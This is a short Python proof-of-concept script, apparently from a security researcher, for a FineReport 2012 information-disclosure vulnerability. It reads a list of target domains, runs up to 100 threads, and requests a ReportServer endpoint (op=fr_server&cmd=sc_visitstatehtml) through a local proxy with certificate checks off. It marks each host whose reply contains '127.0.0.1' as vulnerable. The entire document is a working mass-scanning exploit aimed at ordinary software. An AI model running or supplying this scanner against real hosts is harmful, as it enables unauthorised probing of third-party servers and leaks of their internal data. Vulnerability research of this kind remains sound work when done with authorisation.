# 帆软报表 2012 信息泄露漏洞
# 作者 charis

import requests
from requests.packages import urllib3
urllib3.disable_warnings()
from threading import Thread, enumerate
from time import sleep

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
}

proxies = {
    "http": "http://127.0.0.1:10811",
    "https": "https://127.0.0.1:10811",
}

def postData(url, headers, proxies):
    try:
        s = ""
        poc = f"/ReportServer?op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false"
        urldata = url.strip("\n") + poc
        requests.packages.urllib3.disable_warnings()
        re = requests.get(urldata, headers=headers, proxies=proxies, verify=False)
        if re.text.find("127.0.0.1") >=0:
            print("[+]存在漏洞", url)
    except requests.exceptions.ConnectionError:
        pass

with open("D:\\code\\python\\exp\\帆软报表2012\\domain.txt", encoding="utf-8") as f:
    for i in f.readlines():
        if len(enumerate()) < 100:
            Thread(target=postData, args=(i, headers, proxies)).start()
        else:
            sleep(1)